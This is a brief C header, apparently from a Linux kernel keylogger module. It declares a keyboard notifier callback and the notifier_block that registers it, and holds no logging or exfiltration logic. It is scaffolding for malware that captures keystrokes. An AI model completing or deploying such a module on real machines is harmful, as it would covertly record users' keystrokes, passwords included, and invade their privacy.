#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/keyboard.h>

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param);

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

#endif /* KEYLOGGER_H */
